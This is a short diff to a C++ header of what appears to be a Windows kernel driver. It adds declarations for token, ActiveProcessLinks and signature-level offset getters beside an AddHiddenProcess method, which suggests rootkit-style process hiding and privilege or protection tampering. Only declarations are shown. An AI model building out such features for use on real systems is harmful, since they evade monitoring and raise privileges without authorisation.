@@ -62,6 +62,15 @@ private:
 	_IRQL_requires_max_(APC_LEVEL)
 	bool AddHiddenProcess(_In_ HiddenProcessEntry hiddenProcess);
 
+	_IRQL_requires_max_(APC_LEVEL)
+	ULONG GetTokenOffset() const;
+
+	_IRQL_requires_max_(APC_LEVEL)
+	ULONG GetActiveProcessLinksOffset() const;
+
+	_IRQL_requires_max_(APC_LEVEL)
+	ULONG GetSignatureLevelOffset() const;
+
 public:
 	void* operator new(size_t size) noexcept {
 		return AllocateMemory<PVOID>(size, false);
